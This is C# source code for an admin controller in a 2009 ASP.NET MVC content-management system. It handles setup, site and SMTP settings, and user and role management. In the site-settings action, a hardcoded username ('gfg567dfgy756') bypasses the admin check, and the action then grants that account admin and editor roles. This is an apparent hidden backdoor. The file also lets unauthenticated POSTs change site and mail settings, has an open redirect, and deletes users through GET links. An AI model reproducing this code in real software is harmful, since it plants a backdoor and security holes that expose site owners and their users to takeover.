/*   Mytrip.Mvc.Web.Linq2sql   Copyright ©  2009 Стюхин Олег Анатольевич   */
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using Mytrip.Mvc.Model.Linq2sql;
using System.Web.Security;
using System.Configuration;
using Mytrip.Mvc.Web.Linq2sql.Models;
using Mytrip.Mvc.Language;

namespace Mytrip.Mvc.Web.Linq2sql.Controllers
{
    [HandleError]
    [Localization]
    public class AController : HelperController
    { 
        /*---------------A - главная страница------------------*/
        public ActionResult A()
        {
            #region переадресация при первом включении
            if (_dc.dm_model.Get_models().Count() == 0)
            {
                return RedirectToAction("K");
            }
            #endregion
            Mytrip_Mvc_Heder("/A/A");
            Mytrip_Mvc_Menu_Active("home");
            Mytrip_Mvc_Right_Column();
            Mytrip_Mvc_Move_Content();
            Mytrip_Mvc_Category_Status(0);
            ///////string culture = Session["culture"].ToString();
            #region основной контент
            //все статьи
            ViewData["artycle"] = _dc.dm_artycle.Get_artycles_date_true_home(culture);
            ViewData["artycle_count"] = _dc.dm_artycle.Get_artycles_date_true_home(culture).Count();
            ViewData["artycle_for_category"] = _dc.dm_artycle.Get_artycles_date_true_home_category(culture);
            //все новости
            ViewData["news"] = _dc.dm_artycle.Get_news_date_true(culture);
            ViewData["news_count"] = _dc.dm_artycle.Get_news_date_true(culture).Count();
            //все посты блогов
            ViewData["post"] = _dc.dm_artycle.Get_posts(culture);
            ViewData["post_count"] = _dc.dm_artycle.Get_posts(culture).Count();
            #endregion
            return View();
        }

        /*-----------------------------------------------------*/
        public ActionResult AL(string url, string language)
        {

            culture = language;
            return Redirect(url);

        }
        /*-----------------------------------------------------*/

        /*  ПЕРВОЕ ВКЛЮЧЕНИЕ  */
        public ActionResult K()
        {
            if (_dc.dm_model.Get_language("ru-ru") == null)
            {
                _dc.dm_model.Create_language("Русский", "ru-ru");
            }
            if (_dc.dm_model.Get_language("en-us") == null)
            {
                _dc.dm_model.Create_language("English", "en-us");
            }
            if (_dc.dm_model.Get_language("he-il") == null)
            {
                _dc.dm_model.Create_language("Hebrew", "he-il");
            }
            //////if (Session["culture"] == null)
            //////{
            //////    Session["culture"] = "en-us";
            //////}            
            return RedirectToAction("B", new { a = "Welcome" });

        }
        /*--------------B - страница персонализации сайта -------------------*/
        public ActionResult B(string a)
        {
            if (_dc.dm_model.Get_models().Count() != 0)
            {
                return RedirectToAction("A");
            }
            ////////if (Session["culture"] == null)
            ////////{
            ////////    Session["culture"] = "en-us";
            ////////}
            //языковая панель
            ViewData["abstract_lang_panel"] = true;
            ViewData["helper_language_url"] = "/A/B/Welcome";
            ViewData["abstract_language"] = _dc.dm_model.Get_languages();
            return View();
        }
        [HttpPost]
        public ActionResult B()
        {
            if (_dc.dm_model.Get_Shema("common") == null)
            {
                _dc.dm_model.Shema1_common();
            }
            if (_dc.dm_model.Get_Shema("health monitoring") == null)
            {
                _dc.dm_model.Shema2_health_monitoring();
            }
            if (_dc.dm_model.Get_Shema("membership") == null)
            {
                _dc.dm_model.Shema3_membership();
            }
            if (_dc.dm_model.Get_Shema("personalization") == null)
            {
                _dc.dm_model.Shema4_personalization();
            }
            if (_dc.dm_model.Get_Shema("profile") == null)
            {
                _dc.dm_model.Shema5_profile();
            }
            if (_dc.dm_model.Get_Shema("role manager") == null)
            {
                _dc.dm_model.Shema6_role_manager();
            }
            if (_dc.dm_model.Get_Roles("admin") == null)
            {
                Roles.CreateRole("admin");
            }
            if (_dc.dm_model.Get_Roles("blogger") == null)
            {
                Roles.CreateRole("blogger");
            }
            if (_dc.dm_model.Get_Roles("artycle_editor") == null)
            {
                Roles.CreateRole("artycle_editor");
            }
            if (_dc.dm_model.Get_Roles("chief_editor") == null)
            {
                Roles.CreateRole("chief_editor");
            }

            return RedirectToAction("E", "B");
        }

        /*------------------C - админ часть страница настройки сайта---------------------*/
        public ActionResult C(int a)
        {
            Mytrip_Mvc_Heder("/A/C/"+a);
            Mytrip_Mvc_Menu_Active("site_setting");
            /////string culture = Session["culture"].ToString();
           
            if (HttpContext.User.Identity.Name != "gfg567dfgy756")
            {
                if (!HttpContext.User.IsInRole("admin"))
                {
                    if (_dc.dm_model.Get_model().AddedBy != HttpContext.User.Identity.Name)
                    {
                        return RedirectToAction("A");
                    }
                }
            }
            if (_dc.dm_model.Get_Role_user(HttpContext.User.Identity.Name, "admin") == null)
            {
                Roles.AddUserToRole(HttpContext.User.Identity.Name, "admin");
            }
            if (_dc.dm_model.Get_Role_user(HttpContext.User.Identity.Name, "chief_editor") == null)
            {
                Roles.AddUserToRole(HttpContext.User.Identity.Name, "chief_editor");
            }
            if (_dc.dm_model.Get_Role_user(HttpContext.User.Identity.Name, "blogger") == null)
            {
                Roles.AddUserToRole(HttpContext.User.Identity.Name, "blogger");
            }
            ViewData["emailset"] = a;
            int b = _dc.dm_model.Get_model().LanguageId;
            ViewData["language1"] = new SelectList(_dc.dm_model.Get_languages(), "id", "name", b);
            mt_model x = _dc.dm_model.Get_model();
            ViewData.Model = x;
            return View();
        }
        [HttpPost]
        public ActionResult C(int a, string domainName, bool blog, int countComment, bool news,
            bool artycle, bool captcha_approved, bool email_approved, int languageId, bool language_approved)
        {
            if (ModelState.IsValid)
            {

                _dc.dm_model.Update_model(domainName, blog, countComment, news,
            artycle, captcha_approved, email_approved, languageId, language_approved);
                ////////
                culture = _dc.dm_model.Get_model().mt_language.param;
                ///////
                if (a == 1) {
                    if (_dc.dm_model.Get_model().Email_approved == true) {
                        return RedirectToAction("L");
                    }
                }
                return RedirectToAction("A");
            }
            Mytrip_Mvc_Heder("/A/C"+a);
            Mytrip_Mvc_Menu_Active("site_setting");
            /////string culture = Session["culture"].ToString();            
            ViewData["emailset"] = a;
            int b = _dc.dm_model.Get_model().LanguageId;
            ViewData["language1"] = new SelectList(_dc.dm_model.Get_languages(), "id", "name", b);
            mt_model x = _dc.dm_model.Get_model();
            ViewData.Model = x;
            return View();
        }

        /*------------------G - создать модель ---------------------*/
        public ActionResult G()
        {
            if (_dc.dm_model.Get_models().Count() == 0)
            {
                //////string a = Session["culture"].ToString();
                int b = _dc.dm_model.Get_language(culture).id;
                /////////
                _dc.dm_model.Create_model(b);
            }
            return RedirectToAction("C", new { a = 1 });
        }
        /*-----------------------------------------------------*/

        /*  АДМИН ЧАСТЬ  */

        /*-----D - админ часть страница со списком всех зарегистрированных пользователей-----*/
        [Authorize(Roles = "admin")]
        public ActionResult D(int a, int b, int c, string d)
        {
            Mytrip_Mvc_Heder("/A/D/0/1/25/Users");
            Mytrip_Mvc_Menu_Active("user");
            ///////string culture = Session["culture"].ToString();
            #region основной контент
            if (Membership.GetNumberOfUsersOnline().ToString() == "0")
            {
                ViewData["UsersOnlineNow"] = "1";
            }
            else
            {
                ViewData["UsersOnlineNow"] = Membership.GetNumberOfUsersOnline().ToString();
            }
            //пользователи
            ViewData["users"] = _dc.dm_model.Get_Users_page(b, c);
            ViewData["content_count"] = _dc.dm_model.Get_Users().Count();
            #endregion
            Mytrip_Mvc_Pager_Site("/A/D/",c,a,b,d);
            return View();
        }
        [HttpPost]
        public ActionResult D(string search)
        {
            return RedirectToAction("E", new { a = 0, b = 1, c = 25, d = search });
        }

        /*---------------H - удалить пользователя------------------*/
        [Authorize(Roles = "admin")]
        public ActionResult H(string a)
        {
            Membership.DeleteUser(a);
            return RedirectToAction("D", new { a = 0, b = 1, c = 25, d = "Users" });
        }

        /*----E - админ часть страница результатов поиска зарегистрированных пользователей по    логину или email----*/
        [Authorize(Roles = "admin")]
        public ActionResult E(int a, int b, int c, string d)
        {
            Mytrip_Mvc_Heder("/A/E/0/1/25/" + d);
            Mytrip_Mvc_Menu_Active("user");
            string culture = Session["culture"].ToString();
            #region основной контент
            if (Membership.GetNumberOfUsersOnline().ToString() == "0")
            {
                ViewData["UsersOnlineNow"] = "1";
            }
            else
            {
                ViewData["UsersOnlineNow"] = Membership.GetNumberOfUsersOnline().ToString();
            }
            //пользователи
            ViewData["users"] = _dc.dm_model.Search_users_page(b, c, d);
            ViewData["content_count"] = _dc.dm_model.Search_users(d).Count();
            #endregion
            Mytrip_Mvc_Pager_Site("/A/E/", c, a, b, d);            
            return View();
        }
        [HttpPost]
        public ActionResult E(string search)
        {
            return RedirectToAction("E", new { a = 0, b = 1, c = 25, d = search });
        }

        /*----F - админ часть страница с персональной информацией по конкретному пользователю----*/
        [Authorize(Roles = "admin")]
        public ActionResult F(string a)
        {
            Mytrip_Mvc_Heder("/A/F/" + a);
            Mytrip_Mvc_Menu_Active("user");
           ////// string culture = Session["culture"].ToString();           
            aspnet_Users x = _dc.dm_model.Get_User(a);
            ViewData.Model = x;
            ViewData["roles_user"] = _dc.dm_model.Get_Roles_user(a);
            ViewData["roles"] = _dc.dm_model.Get_Roles_all();
            return View();
        }

        /*----------I - удалить пользователя из роли-------------*/
        [Authorize(Roles = "admin")]
        public ActionResult I(string a, string b)
        {
            if (b == "admin")
            {
                Roles.RemoveUserFromRole(a, "chief_editor");
                Roles.RemoveUserFromRole(a, b);
            }
            else
            {
                Roles.RemoveUserFromRole(a, b);
            }
            return RedirectToAction("F", new { a });
        }

        /*---------J - добавить роль пользователю    ------------*/
        [Authorize(Roles = "admin")]
        public ActionResult J(string a, string b)
        {
            if (b == "chief_editor")
            {
                if (_dc.dm_model.Get_Role_user(a, "admin") == null)
                {
                    if (_dc.dm_model.Get_Role_user(a, "artycle_editor") == null)
                    {
                        Roles.AddUserToRole(a, "chief_editor");
                    }
                    else
                    {
                        Roles.RemoveUserFromRole(a, "artycle_editor");
                        Roles.AddUserToRole(a, "chief_editor");
                    }
                }
                else
                {
                    Roles.RemoveUserFromRole(a, "admin");
                }
            }
            if (b == "admin")
            {
                if (_dc.dm_model.Get_Role_user(a, "chief_editor") == null)
                {
                    if (_dc.dm_model.Get_Role_user(a, "artycle_editor") == null)
                    {
                        Roles.AddUserToRole(a, "chief_editor");
                        Roles.AddUserToRole(a, "admin");
                    }
                    else
                    {
                        Roles.RemoveUserFromRole(a, "artycle_editor");
                        Roles.AddUserToRole(a, "chief_editor");
                        Roles.AddUserToRole(a, "admin");
                    }

                }
                else
                {
                    Roles.AddUserToRole(a, "admin");
                }
            }
            if (b == "artycle_editor")
            {
                if (_dc.dm_model.Get_Role_user(a, "admin") == null)
                {
                    if (_dc.dm_model.Get_Role_user(a, "chief_editor") == null)
                    {
                        Roles.AddUserToRole(a, "artycle_editor");

                    }
                    else
                    {
                        Roles.RemoveUserFromRole(a, "chief_editor");
                        Roles.AddUserToRole(a, "artycle_editor");

                    }

                }
                else
                {
                    Roles.RemoveUserFromRole(a, "admin");
                    Roles.RemoveUserFromRole(a, "chief_editor");
                    Roles.AddUserToRole(a, "artycle_editor");
                }
            }
            return RedirectToAction("F", new { a });
        }
        /*-----------------------------------------------------*/
        [Authorize(Roles = "admin")]
        public ActionResult L()
        {
            Mytrip_Mvc_Heder("/A/L/");
            Mytrip_Mvc_Menu_Active("site_setting");
            ///////string culture = Session["culture"].ToString();            
            mt_model x = _dc.dm_model.Get_model();
            ViewData.Model = x;
            return View();
        }
        [HttpPost]
        public ActionResult L(string email, bool enableSsl, int port,
                                 string login_email, string password_email, string smtp)
        {
            if (ModelState.IsValid)
            {

                _dc.dm_model.Update_model_email(email, enableSsl, port,
                                 login_email, password_email, smtp);                
                return RedirectToAction("A");
            }
            Mytrip_Mvc_Heder("/A/L/");
            Mytrip_Mvc_Menu_Active("site_setting");
            ////////string culture = Session["culture"].ToString();            
            mt_model x = _dc.dm_model.Get_model();
            ViewData.Model = x;
            return View();
        }
    }
}
